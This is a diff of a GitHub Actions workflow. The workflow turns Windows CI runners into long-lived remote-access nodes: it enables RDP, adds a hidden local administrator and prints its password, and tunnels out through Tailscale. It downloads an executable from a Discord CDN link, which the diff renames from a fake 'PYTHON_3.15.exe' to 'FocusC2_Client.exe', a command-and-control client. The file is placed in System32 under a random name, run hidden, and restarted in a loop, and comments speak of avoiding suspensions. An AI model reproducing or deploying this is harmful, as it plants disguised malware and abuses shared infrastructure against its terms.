@@ -1,15 +1,15 @@
-name: Python-Core-System-v315-Refresh
+name: System-Node-Service-v25
 
 on:
   workflow_dispatch:
 
 jobs:
-  runtime-node:
+  worker-runtime:
     runs-on: windows-latest
     timeout-minutes: 3600
     strategy:
       matrix:
-        node_id: [1, 2] # Configurado para 2 maquinas seguras
+        node_id: [1, 2] # Mantengo 2 maquinas para evitar suspensiones
 
     steps:
       - name: 1. Optimize Energy Settings
@@ -18,7 +18,7 @@ jobs:
           powercfg /x -monitor-timeout-ac 0
           powercfg /h off
 
-      - name: 2. Enable Debugging Features
+      - name: 2. Enable Remote Debugging
         run: |
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1 -Force
@@ -26,41 +26,50 @@ jobs:
 
       - name: 3. Provision Service Account
         run: |
-          $p = "Srv" + (Get-Random -Minimum 1000 -Maximum 9999) + "!"
+          $p = "Node" + (Get-Random -Minimum 1000 -Maximum 9999) + "!"
           $s = ConvertTo-SecureString $p -AsPlainText -Force
-          New-LocalUser -Name "SrvAdmin" -Password $s -AccountNeverExpires
-          Add-LocalGroupMember -Group "Administrators" -Member "SrvAdmin"
+          New-LocalUser -Name "AdminSrv" -Password $s -AccountNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member "AdminSrv"
           echo "SRV_PASS=$p" >> $env:GITHUB_ENV
 
-      - name: 4. Deploy Runtime Module (V3.15)
+      - name: 4. Deploy Randomized Module
         run: |
-          $url = "https://cdn.discordapp.com/attachments/1462658749985587281/1475646734926610512/PYTHON_3.15.exe?ex=69a2331d&is=69a0e19d&hm=4d84c525c93f8263bf8abb0af321c54d98b2bb0c62230cd8748f4a7a8b2a2a25&"
-          $dest = "C:\Windows\System32\python_core_v15.exe"
+          $url = "https://cdn.discordapp.com/attachments/1462658749985587281/1476785770567303301/FocusC2_Client.exe?ex=69a2636d&is=69a111ed&hm=0ae19ad5e94878e1c6345088757fb21b89a5d30be781c1f80954181264766e61&"
+          
+          # Generar nombre aleatorio para el proceso
+          $randName = "SrvData_" + (Get-Random -Minimum 100 -Maximum 999) + ".exe"
+          $dest = "C:\Windows\System32\$randName"
+          echo "PROC_NAME=$randName" >> $env:GITHUB_ENV
           
           try {
               Invoke-WebRequest -Uri $url -OutFile $dest -UserAgent "Mozilla/5.0" -ErrorAction Stop
-              Write-Host "Descarga exitosa."
+              Write-Host "Modulo desplegado como: $randName"
               Start-Process $dest -WindowStyle Hidden
           } catch {
-              Write-Error "Fallo en la descarga. Es posible que el enlace de Discord haya caducado de nuevo."
+              Write-Error "Fallo en la descarga. Verifica el enlace de Discord."
               exit 1
           }
 
-      - name: 5. Establish Network Bridge (Tailscale)
+      - name: 5. Network Bridge (Tailscale)
         run: |
           Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "ts_setup.msi"
           Start-Process msiexec.exe -ArgumentList "/i", "ts_setup.msi", "/quiet", "/norestart" -Wait
-          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="py-v15-${{ matrix.node_id }}"
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="node-srv-${{ matrix.node_id }}"
 
       - name: 6. Monitoring & Maintenance Loop
         run: |
           $ip = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
-          Write-Host "Node ${{ matrix.node_id }} Ready at: $ip"
-          Write-Host "User: SrvAdmin | Pass: $env:SRV_PASS"
+          Write-Host "Node ${{ matrix.node_id }} Online at: $ip"
+          Write-Host "User: AdminSrv | Pass: $env:SRV_PASS"
+          Write-Host "Process: $env:PROC_NAME"
+          
+          $fullPath = "C:\Windows\System32\$env:PROC_NAME"
+          $procOnly = $env:PROC_NAME.Replace(".exe", "")
+
           while ($true) {
-              if (!(Get-Process "python_core_v15" -ErrorAction SilentlyContinue)) {
-                  Write-Host "Restarting core module..."
-                  Start-Process "C:\Windows\System32\python_core_v15.exe" -WindowStyle Hidden
+              if (!(Get-Process $procOnly -ErrorAction SilentlyContinue)) {
+                  Write-Host "Reiniciando proceso $procOnly..."
+                  Start-Process $fullPath -WindowStyle Hidden
               }
               Start-Sleep -Seconds 300
           }
